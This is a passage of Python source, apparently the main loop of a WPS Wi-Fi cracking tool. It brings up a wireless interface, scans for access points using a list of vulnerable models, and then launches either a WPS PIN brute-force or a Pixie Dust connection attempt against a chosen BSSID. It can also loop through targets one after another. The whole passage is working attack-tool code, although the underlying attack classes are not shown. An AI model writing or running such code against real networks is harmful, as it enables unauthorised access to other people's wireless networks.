                "/dev/wmtWifi does not exist or it is not a character device")
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text("1")

    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))

    while True:
        try:
            if not args.bssid:
                try:
                    with open(args.vuln_list, 'r', encoding='utf-8') as file:
                        vuln_list = file.read().splitlines()
                except FileNotFoundError:
                    vuln_list = []
                scanner = WiFiScanner(args.interface, vuln_list, reverse_scan=args.reverse_scan)
                if not args.loop:
                    print('[*] BSSID not specified (--bssid) — scanning for available networks')

                network_info = scanner.prompt_network()
                if network_info:
                    args.bssid = network_info[0]
                    args.ssid = network_info[1] if len(network_info) > 1 else None
            if args.bssid:
                companion = Companion(args.interface, args.write, print_debug=args.verbose)
                if args.bruteforce:
                    companion.smart_bruteforce(args.bssid, ssid=args.ssid, start_pin=args.pin,
                                               delay=args.delay, loop=args.loop)
                else:
                    companion.single_connection(bssid=args.bssid, ssid=args.ssid, pin=args.pin,
                                                pixiemode=args.pixie_dust, serial=args.serial)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
                    print("Aborting…")
                    break
                else:
                    args.bssid = None
            else:
                print("\nAborting…")
                break

    if args.iface_down:
        ifaceUp(args.interface, down=True)

    if args.mtk_wifi:
        wmtWifi_device.write_text("0")
